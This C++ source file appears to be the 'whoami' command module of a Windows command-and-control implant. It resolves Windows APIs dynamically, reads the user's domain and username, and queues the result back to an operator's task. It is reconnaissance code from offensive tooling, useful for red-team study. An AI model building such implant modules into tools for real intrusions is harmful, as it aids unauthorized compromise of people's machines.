#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_WHOAMI

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_whoami(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    char result[320] = { 0 };

    // domain
    wchar_t domain_w[128] = { 0 };
    inst.kernel32.GetEnvironmentVariableW(
        symbol<LPCWSTR>( L"USERDOMAIN" ),
        domain_w, 128
    );

    char domain[128] = { 0 };
    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );

    // username
    wchar_t user_w[128] = { 0 };
    DWORD usize = 128;
    inst.advapi32.GetUserNameW( user_w, &usize );

    char user[128] = { 0 };
    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, user_w, -1, user, 128, nullptr, nullptr );

    // domain\user
    str_copy( result, domain );
    str_concat( result, symbol<char*>( const_cast<char*>( "\\" ) ) );
    str_concat( result, user );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, result );
}

#endif
